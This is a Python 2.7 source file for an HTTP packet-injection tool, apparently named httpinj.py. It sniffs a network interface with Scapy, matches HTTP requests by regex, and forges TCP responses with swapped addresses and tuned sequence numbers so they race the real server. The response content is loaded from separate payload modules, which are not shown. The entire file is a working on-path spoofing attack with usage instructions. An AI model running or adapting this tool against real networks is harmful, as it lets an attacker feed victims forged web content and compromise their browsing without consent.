#!/usr/bin/env python2.7

import argparse
from scapy.all import *
import re
import getopt
import importlib


# callback, called for each sniffed packet
# Determine whether we should inject or not.
def determine_packet(packet):
    # print packet[IP].src, packet[IP].dst

    try:
        packet[TCP][Raw]
    except IndexError:
        return
    else:

        if re.search(regex, packet[TCP][Raw].load):
            # print 'matched'
            if payload_mod.payload.bypass_validate(packet[TCP][Raw].load):
                return
            inject_packet(packet)

# Given a flagged packet, injects a packet
def inject_packet (flagged_packet):

    http_reponse = payload_mod.payload.http_payload()

    # Spin up a new packet
    to_inject = Ether()/IP()/TCP()/http_reponse
    # Assign the packet its necessary values:
    #Ether fields: flip the src and dst
    to_inject[Ether].src = flagged_packet[Ether].dst
    to_inject[Ether].dst = flagged_packet[Ether].src
    # IP fields: flip src and dst, and increment ipid by some random amount
    to_inject[IP].src = flagged_packet[IP].dst
    to_inject[IP].dst = flagged_packet[IP].src
    to_inject[IP].id = flagged_packet[IP].id + 112
    # TCP fields: flip sport and dport, set ack and seq, set flags
    to_inject[TCP].sport = flagged_packet[TCP].dport
    to_inject[TCP].dport = flagged_packet[TCP].sport
    to_inject[TCP].ack = len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].seq = flagged_packet[TCP].ack
    to_inject[TCP].flags = "PA"
    # Delete ip length and chksum and tcp chksum so Scapy will recalculate them
    del to_inject[IP].len
    del to_inject[IP].chksum
    del to_inject[TCP].chksum
    # Send the packet!
    sendp(to_inject, verbose=False)

def main(argv):
    global interface
    global payload_mod
    global regex

    def printHelp():
        print """
        (python2.7 |./)httpinj.py [-i interface] [-r regexp] [-p payload] expression

        -i --interface Listen on network device (defaults to eth0).

        -r --regex Use regular expression to match the request packets for which a response will be spoofed.

        -p --payloadname The payload name 

        expression is a packet filter.

        Defaults will be used for anything not provided.

        eg: python httpinj.py -i eth0 -r "GET / HTTP/" -d example "tcp and port 80"
        """

    payloadname = 'example'
    interface = 'eth0'
    regex = r'^GET \/ HTTP\/1\.1'

    try:
        opts, args = getopt.getopt(argv[1:], 'i:r:p:h', ['interface=', 'regexp=', 'payloadname=', 'help'])
    except getopt.GetoptError:
        printHelp()
        exit(64)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            printHelp()
            exit(0)
        elif opt in ('-i', '--interface'):
            interface = arg
        elif opt in ('-r', '--regexp'):
            regex = arg
        elif opt in ('-p', '--payloadname'):
            payloadname = arg
        else:
            printHelp()
            exit(64)


    payload_mod = importlib.import_module("payload." + payloadname)
    sniff(iface=interface, filter=' '.join(args), prn=determine_packet)

if __name__ == "__main__":
    main(sys.argv)